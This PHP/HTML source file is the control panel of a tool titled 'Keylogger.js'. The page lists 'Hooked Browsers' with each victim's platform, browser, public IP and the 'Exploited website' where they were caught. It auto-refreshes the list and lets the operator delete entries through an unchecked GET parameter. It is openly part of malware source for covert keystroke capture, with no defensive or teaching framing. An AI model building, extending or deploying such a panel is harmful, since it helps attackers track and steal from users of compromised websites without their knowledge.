<?php
    include_once('inc/browsers.inc.php');

    if(isset($_GET['delete']) && !empty($_GET['delete'])) {
        deleteHookedBrowsers($_GET['delete']);
    }
?>

<html>
    <head>
        <meta charset="UTF-8">
        <link rel="stylesheet" href="css/bootstrap.css"/>
        <link rel="stylesheet" href="css/style.css"/>
        <title>Keylogger.js</title>
        <link rel="icon" type="image/png" sizes="32x32" href="img/favicon.ico">
    </head>

    <body id="body">
        <div class="container-fluid">      
            <?php        
                include_once('inc/header.inc.php');
            ?>
        </div>
        <div class="container">
            <div class="row"> 
                <div class="col-lg-12">
                    <div class="text-center logo">
                        <img src="img/logo.png"/>
                    </div>                    
                    <div class="panel panel-default container-fluid" id="summaryBrowserPanel">
                        <div class="panel-heading">
                            <h3 class="panel-title">Hooked Browsers</h3>
                        </div>
                        <div class="panel-body" id="refreshPanel1">
                            <table class="table table-bordered table-striped table-condensed">
                                <thead>
                                    <tr>
                                        <th class="text-center">Online</th>
                                        <th class="text-center">browser Id</th>
                                        <th class="text-center">Platform</th>
                                        <th class="text-center">Browser</th>
                                        <th class="text-center">Browser version</th>
                                        <th class="text-center">Browser type</th>
                                        <th class="text-center">Public IP</th>
                                        <th class="text-center">Exploited website</th>
                                        <th class="text-center">Action</th>
                                    </tr>
                                </thead>
                                <tbody id="tbody">
                                    <?php
                                        include_once('summaryBrowsersPanel.php');
                                    ?>
                                </tbody>
                            </table>
                        </div>
                    </div>                
                </div>
            </div>
        </div>    

        <script src="http://code.jquery.com/jquery-latest.js"></script>
        <script type="text/javascript">
            setInterval("my_function();",3000); 
            function my_function(){
                $('#tbody').load('summaryBrowsersPanel.php');
            }
        </script>

    </body>
</html>